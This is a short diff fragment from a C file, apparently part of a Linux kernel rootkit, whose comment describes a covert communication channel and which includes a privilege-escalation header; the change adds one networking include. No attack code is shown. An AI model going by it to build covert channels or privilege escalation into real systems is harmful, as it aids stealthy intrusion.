@@ -1,6 +1,8 @@
 /*
  * All functionality needed for the covert communication channel.
  */
+#include <linux/inet.h>
+ 
 #include "control.h"
 #include "include.h"
 #include "privilege_escalation.h"
